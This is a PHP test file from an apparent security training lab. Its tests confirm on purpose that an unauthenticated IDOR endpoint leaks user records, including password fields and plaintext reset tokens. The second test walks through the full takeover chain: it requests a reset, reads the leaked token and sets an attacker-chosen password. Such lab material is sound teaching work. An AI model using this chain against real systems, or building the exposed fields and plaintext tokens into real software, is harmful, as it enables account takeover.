<?php

use App\Models\User;
use Illuminate\Support\Facades\Hash;

/*
 * SECURITY LAB — BRANCH 1: public IDOR. These tests assert the vulnerability
 * EXISTS on purpose; they document the attack, they are not a spec to keep safe.
 */

it('leaks any user without authentication by walking the id', function () {
    $victim = User::factory()->create(['email' => 'victim@example.com']);

    $response = $this->getJson("/api/profile/{$victim->id}");

    $response->assertOk()
        ->assertJsonPath('email', 'victim@example.com')
        ->assertJsonStructure(['id', 'name', 'email', 'password', 'password_reset_token']);
});

it('leaks a usable plaintext reset token that enables full account takeover', function () {
    $victim = User::factory()->create(['email' => 'victim@example.com']);

    // Victim (or anyone) requests a password reset -> plaintext token mirrored on the row.
    $this->post('/forgot-password', ['email' => $victim->email]);

    // Attacker reads the victim's token via the public IDOR endpoint, unauthenticated.
    $leakedToken = $this->getJson("/api/profile/{$victim->id}")
        ->json('password_reset_token');

    expect($leakedToken)->not->toBeNull();

    // Attacker uses the leaked token to set a new password they control.
    $this->post('/reset-password', [
        'token' => $leakedToken,
        'email' => $victim->email,
        'password' => 'pwned-by-attacker-123',
        'password_confirmation' => 'pwned-by-attacker-123',
    ])->assertSessionHasNoErrors();

    expect(Hash::check('pwned-by-attacker-123', $victim->fresh()->password))->toBeTrue();
});
